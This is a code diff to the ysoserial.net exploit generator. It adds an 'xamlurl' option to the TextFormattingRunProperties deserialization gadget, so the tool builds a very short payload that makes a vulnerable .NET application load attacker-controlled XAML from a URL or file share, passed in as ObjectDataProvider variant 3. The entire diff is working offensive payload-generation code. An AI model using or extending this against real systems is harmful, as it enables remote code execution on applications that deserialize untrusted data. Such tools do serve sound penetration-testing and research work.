@@ -3,6 +3,7 @@ using System.Runtime.Serialization;
 using System.Collections.Generic;
 using Microsoft.VisualStudio.Text.Formatting;
 using ysoserial.Helpers;
+using NDesk.Options;
 
 namespace ysoserial.Generators
 {
@@ -27,16 +28,19 @@ namespace ysoserial.Generators
         }
     }
 
+
     class TextFormattingRunPropertiesGenerator : GenericGenerator
     {
+        private string xaml_url = "";
+
         public override string Name()
         {
             return "TextFormattingRunProperties";
         }
 
-        public override string Description()
+        public override string AdditionalInfo()
         {
-            return "TextFormattingRunProperties gadget";
+            return "This normally generates the shortest payload";
         }
 
         public override string Finders()
@@ -52,6 +56,16 @@ namespace ysoserial.Generators
         public override List<string> SupportedFormatters()
         {
             return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter" };
+        }
+
+        public override OptionSet Options()
+        {
+            OptionSet options = new OptionSet()
+            {                
+                {"xamlurl=", "This is to create a very short paylaod when affected box can read the target XAML URL (can be a file path on a shared drive or the local system). This is used by the 3rd XAML payload of ObjectDataProvider which is a ResourceDictionary with the Source parameter. Command parameter will be ignored. The shorter the better!", v => xaml_url = v },
+            };
+
+            return options;
         }
 
         public override object Generate(string formatter, InputArgs inputArgs)
@@ -111,6 +125,13 @@ namespace ysoserial.Generators
     </ObjectDataProvider>
 </ResourceDictionary>";
             */
+
+            if (xaml_url != "")
+            {
+                // this is when it comes from GenerateWithInit 
+                inputArgs.ExtraInternalArguments = new List<String> { "--variant", "3", "--xamlurl", xaml_url};
+            }
+
             return Serialize(TextFormattingRunPropertiesGadget(inputArgs), formatter, inputArgs);
         }
 
